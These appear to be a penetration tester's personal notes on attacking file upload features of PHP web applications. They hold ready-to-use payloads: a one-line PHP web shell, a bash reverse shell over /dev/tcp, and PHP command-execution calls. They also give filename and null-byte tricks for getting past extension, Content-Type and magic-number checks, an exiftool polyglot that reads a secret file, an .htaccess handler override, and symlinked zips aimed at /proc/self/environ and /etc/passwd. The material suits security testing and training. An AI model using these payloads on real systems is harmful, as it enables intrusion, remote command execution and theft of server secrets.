#File_upload

**Test every php extension** 

- Find the right extension with burp :
![[upload 2.png]]

- Script generate extension list : 

```python
var = ".php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module"
var_list = var.split(", ")

with open("extensions.txt", "w") as file:
    for extension in var_list:
        file.write(extension + "\n")
```   

![[upload 7.png]]

- Check every file that send an echo "test" : 
![[upload 6.png]]

`Same technique now check every response that print Demonize or "test"`

![[upload 4.png]]

- Check the disable function  :
![[upload 3.png]]

- Here is a list or other possible function to test to execute command : 

	- **exec** - Returns last line of commands output:
	 ``` echo exec("uname -a"); ```
	 - **passthru** - Passes commands output directly to the browser:
	 ```echo passthru("uname -a");```
	 - **system** - Passes commands output directly to the browser and returns last line:
	 ```echo system("uname -a");```
	 - **shell_exec** - Returns commands output :
	 ``` echo shell_exec("uname -a"); ```
	 - **popen** - Opens read or write pipe to process of a command:
	 ```echo fread(popen("/bin/ls /", "r"), 4096);```
	 - **proc_open** - Similar to popen() but greater degree of control:
	 ```proc_close(proc_open("uname -a",array(),$something)); ```
	 - **preg_replace** :
	 ``` <?php preg_replace('/.*/e', 'system("whoami");', ''); ?> ```
	 - **pcntl_exec** - Executes a program (by default in modern and not so modern PHP you need to load the `pcntl.so` module to use this function) :
	 ```pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);```

**Bypass file extensions checks**

1. If they apply, the **check** the **previous extensions.** Also test them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._
    
2. _Check_ _**adding a valid extension before**_ _the execution extension (use previous extensions also):_
    - _file.png.php_
    - _file.png.Php5_
    
3. Try adding **special characters at the end.** You could use Burp to **bruteforce** all the **ascii** and **Unicode** characters. (_Note that you can also try to use the_ _**previously**_ _motioned_ _**extensions**_)
    
    - _file.php%20_
        
    - _file.php%0a_
        
    - _file.php%00_
        
    - _file.php%0d%0a_
        
    - _file.php/_
        
    - _file.php.\_
        
    - _file._
        
    - _file.php...._
        
    - _file.pHp5...._    
    
4. Try to bypass the protections **tricking the extension parser** of the server-side with techniques like **doubling** the **extension** or **adding junk** data (**null** bytes) between extensions. _You can also use the_ _**previous extensions**_ _to prepare a better payload._
    
    - _file.png.php_
        
    - _file.png.pHp5_
        
    - _file.php#.png_
        
    - _file.php%00.png_
        
    - _file.php\x00.png_
        
    - _file.php%0a.png_
        
    - _file.php%0d%0a.png_
        
    - _file.phpJunk123png_
        
    
5. Add **another layer of extensions** to the previous check:
    - _file.png.jpg.php_
        
    - _file.php%00.png%00.jpg_
    
6. Try to put the **exec extension before the valid extension** and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
    
    - _ex: file.php.png_
        
    
7. Using **NTFS alternate data stream (ADS)** in **Windows**. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an **empty file with the forbidden extension** will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. T
    
8. Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php
    

```sh
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

9. Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename :

	`exploit.p.phphp`

**Bypass Content-Type, Magic Number**

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_

 Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
   
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**: 

`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

Or you could also **introduce the payload directly** in an image: 

`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`

- Interesting tool Upload bypass :
https://github.com/sAjibuu/Upload_Bypass

- You can also an LFI do bypass restriction for example : 
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php`

DO NOT forget try double encoding ect ...

- Htaccess ( Web shell upload via extension blacklist bypass ): 

1- Upload a file name as .htaccess 
2- Change the value of the `Content-Type` header to `text/plain`
3- Replace the contents of the file (your PHP payload) with the following Apache directive:

`AddType application/x-httpd-php .l33t`

Resources: 
https://thibaud-robin.fr/articles/bypass-filter-upload/

**Race Condition :**
![[upload 8.png]]

![[upload 9.png]]

- Tester la présence d'un Anti-virus : 
```sh
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```


- Zip :
Try to upload a zip with symlink to `/etc/password` or `the page himself` (index.php)
Be aware of `opendir` !! 
```sh
ln -s /proc/self/environ test.txt
zip --symlinks user.zip test.txt
```